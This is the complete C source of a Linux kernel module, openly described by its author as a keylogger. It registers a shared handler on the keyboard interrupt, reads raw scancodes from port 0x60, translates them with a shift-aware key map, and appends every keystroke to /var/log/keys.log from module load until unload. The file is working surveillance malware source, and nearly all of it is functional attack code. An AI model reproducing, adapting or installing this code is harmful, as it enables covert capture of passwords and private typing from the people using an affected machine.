/*******************************************************************
 * A Linux Kernel module keylogger! 🧐
 *
 * Copyright (C) 2020, Shaswata Das <shaswata56@gmail.com>
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor,
 * Boston, MA  02110-1301, USA.
 *
 *******************************************************************/

#include <linux/fs.h>
#include <asm/uaccess.h>
#include <linux/input.h>
#include <linux/module.h>
#include <linux/kbd_kern.h>
#include <linux/interrupt.h>

#define DRIVER_AUTHOR "Shaswata Das <shaswata56@gmail.com>"
#define DRIVER_DESC "A Linux Kernel module keylogger! 🧐"
#define DRIVER_NAME "klogger"
#define DRIVER_LICENSE "GPL"
#define DRIVER_VERSION "2.2.0"

MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_LICENSE(DRIVER_LICENSE);
MODULE_VERSION(DRIVER_VERSION);
MODULE_DESCRIPTION(DRIVER_DESC);

extern int shift_state;

#define KBD_IRQ 1
#define BUF_LEN 12
#define LOG_FILE "/var/log/keys.log"

static int shift;
static loff_t log_offset;
static unsigned char key_code;
static char *start = "\tStarted Keylogger!\n";
static struct file *file = (struct file *) NULL;

static const char *keymap[120][2] = {
	{"\0", "\0"}, {"ESC", "ESC"}, {"1", "!"}, {"2", "@"}, {"3", "#"},
	{"4", "$"}, {"5", "%"}, {"6", "^"}, {"7", "&"}, {"8", "*"}, {"9", "("},
	{"0", ")"}, {"-", "_"}, {"=", "+"}, {"Backspace", "Backspace"},
	{"Tab", "Tab"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"}, {"o", "O"}, {"p", "P"},
	{"[", "{"}, {"]", "}"}, {"Enter", "Enter"}, {"Lctrl", "Lctrl"},
	{"a", "A"}, {"s", "S"}, {"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},
	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"}, {"'", "\""}, {"`", "~"},
	{"Lshift", "Lshift"}, {"\\", "|"}, {"z", "Z"}, {"x", "X"}, {"c", "C"},
	{"v", "V"}, {"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"}, {".", ">"},
	{"/", "?"}, {"Rshift", "Rshift"}, {"PrtScr", "Num[*]"}, {"Lalt", "Lalt"},
	{"Space", "Space"}, {"CapsLock", "CapsLock"}, {"F1", "F1"}, {"F2", "F2"},
	{"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"}, {"F6", "F6"}, {"F7", "F7"},
	{"F8", "F8"}, {"F9", "F9"}, {"F10", "F10"}, {"NumLock", "NumLock"},
	{"ScrLock", "ScrLock"}, {"Num[7]", "Home"}, {"Num[8]", "Up"},
	{"Num[9]", "PgUp"}, {"Num[-]", "Num[-]"}, {"Num[4]", "Left"},
	{"Num[5]", "Num[5]"}, {"Num[6]", "Right"}, {"Num[+]", "Num[+]"},
	{"Num[1]", "End"}, {"Num[2]", "Down"}, {"Num[3]", "PgDn"},
	{"Num[0]", "Ins"}, {"Num[.]", "Del"}, {"SysRq", "SysRq"}, {"\0", "\0"},
	{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"}, {"\0", "\0"},
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
	{"Enter", "Enter"}, {"Rctrl", "Rctrl"}, {"Num[/]", "Num[/]"},
	{"PrtScr", "PrtScr"}, {"Ralt", "Ralt"}, {"\0", "\0"}, {"Home", "Home"},
	{"Up", "Up"}, {"PgUp", "PgUp"}, {"Left", "Left"}, {"Right", "Right"},
	{"End", "End"}, {"Down", "Down"}, {"PgDn", "PgDn"}, {"Ins", "Ins"},
	{"Del", "Del"},  {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},  {"Pause", "Pause"}
};

static struct file* file_open(const char *path, int flags, int rights)
{
	struct file *f = NULL;
	mm_segment_t old_fs;

	old_fs = get_fs();
	set_fs(KERNEL_DS);
	f = filp_open(path, flags, rights);
	set_fs(old_fs);

	if(IS_ERR(f))
		return NULL;

	return f;
}

void code_to_keys(int keycode, int is_shift, char *buf)
{
	if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE)
	{
		const char *key = (is_shift == 1) ? keymap[keycode][1] :
			keymap[keycode][0];
		
		snprintf(buf, BUF_LEN, "%s ", key);
	}
}

void log_kbd(unsigned long icode)
{
	size_t len;
	int mkshift = 0;
	char logbuf[BUF_LEN] = {0};

	if (key_code == 54 || key_code == 42)
	{
		shift = 1;
		return;
	}
	else
	{
		mkshift = 1;
	}

	code_to_keys(key_code, shift, logbuf);
	len = strlen(logbuf);
	if (len < 1)
		return;

	if (mkshift)
		shift = 0;
	
	kernel_write(file, logbuf, len, &log_offset);
}

DEFINE_SPINLOCK(k_lock);
DECLARE_TASKLET(klogger_tasklet, log_kbd, 0);

irq_handler_t handle_kbd_irq(int irq, void *dev_id, struct pt_regs *regs)
{
	spin_lock(&k_lock);
	key_code = inb(0x60);
	spin_unlock(&k_lock);
	tasklet_schedule(&klogger_tasklet);
	return (irq_handler_t)IRQ_HANDLED;
}

static int __init klogger_init(void)
{
	char buf[16] = {0};
	file = file_open(LOG_FILE, O_WRONLY | O_CREAT | O_APPEND, S_IRUSR);
	if (IS_ERR(file))
		return -ENOENT;

	snprintf(buf, sizeof(buf), "\n%lld", ktime_get_real_ns());
	kernel_write(file, buf, strlen(buf), &log_offset);									
	kernel_write(file, start, strlen(start), &log_offset);
	return request_irq(KBD_IRQ, (irq_handler_t)handle_kbd_irq, IRQF_SHARED, 
			DRIVER_NAME, &key_code);
}

static void __exit klogger_exit(void)
{
	tasklet_kill(&klogger_tasklet);
	free_irq(KBD_IRQ, &key_code);
	filp_close(file, NULL);
}

module_init(klogger_init);
module_exit(klogger_exit);
